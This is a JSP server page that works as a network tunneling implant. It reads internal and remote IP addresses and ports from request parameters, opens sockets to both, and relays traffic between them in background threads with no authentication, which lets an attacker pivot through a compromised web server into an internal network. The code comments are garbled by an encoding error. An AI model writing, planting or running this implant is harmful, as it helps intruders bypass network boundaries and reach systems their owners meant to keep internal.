<%@page pageEncoding="utf-8"%>
<%@page import="java.io.*"%>
<%@page import="java.util.*"%>
<%@page import="java.util.regex.*"%>
<%@page import="java.sql.*"%>
<%@page import="java.nio.charset.*"%>
<%@page import="javax.servlet.http.HttpServletRequestWrapper"%>
<%@page import="java.text.*"%>
<%@page import="java.net.*"%>
<%
try {
final String localIP = request.getParameter("localIP");
final String localPort = request.getParameter("localPort");
final String remoteIP =request.getParameter("remoteIP");
final String remotePort =request.getParameter("remotePort");
new Thread(new Runnable(){
public void run(){
while (true) {
Socket soc = null;
Socket remoteSoc = null;
DataInputStream remoteIn = null;
DataOutputStream remoteOut = null;
DataInputStream localIn = null;
DataOutputStream localOut = null;
try{
soc = new Socket();
soc.connect(new InetSocketAddress(localIP,Integer.parseInt(localPort)));//���ӱ���socket
remoteSoc = new Socket();
remoteSoc.connect(new InetSocketAddress(remoteIP,Integer.parseInt(remotePort)));
remoteIn = new DataInputStream(remoteSoc.getInputStream());
remoteOut = new DataOutputStream(remoteSoc.getOutputStream());
localIn = new DataInputStream(soc.getInputStream());
localOut = new DataOutputStream(soc.getOutputStream());
this.readFromLocal(localIn,remoteOut);//���ӱ��� д�뵽Զ��
this.readFromRemote(soc,remoteSoc,remoteIn,localOut);//��Զ�̶���д�뵽����
}catch(Exception ex)
{ 
break;
}
} // end while
} // end run
//�ӱ��ض�
public void readFromLocal(final DataInputStream localIn,final DataOutputStream remoteOut){
new Thread(new Runnable(){
public void run(){
while (true) {
try{
byte[] data = new byte[100];
int len = localIn.read(data); //�ӱ��������ж�����Ϣ��д�뵽Զ��socket
while (len != -1) {
remoteOut.write(data,0,len);
len = localIn.read(data);
}
}catch (Exception e) {
break;
}
}
}
}).start();
} // end readFromLocal
//��Զ��socket��ȡ ����д�뵽����
public void readFromRemote(final Socket soc,final Socket remoteSoc,final DataInputStream remoteIn,final DataOutputStream localOut){
new Thread(new Runnable(){
public void run(){
while(true) {
try{
byte[] data = new byte[100];
int len = remoteIn.read(data);
while (len != -1) {
localOut.write(data,0,len); //��Զ�̶� д�뵽����socket
len = remoteIn.read(data);
}
}catch (Exception e) {
try{
soc.close();
remoteSoc.close();
}catch(Exception ex) {
}
break;
}
}
}// end run
}).start();
}
}).start(); //����߳� ���� ���ҿ�ʼ�߳�
} catch (Exception e) {
e.printStackTrace();
throw e ;
}
%>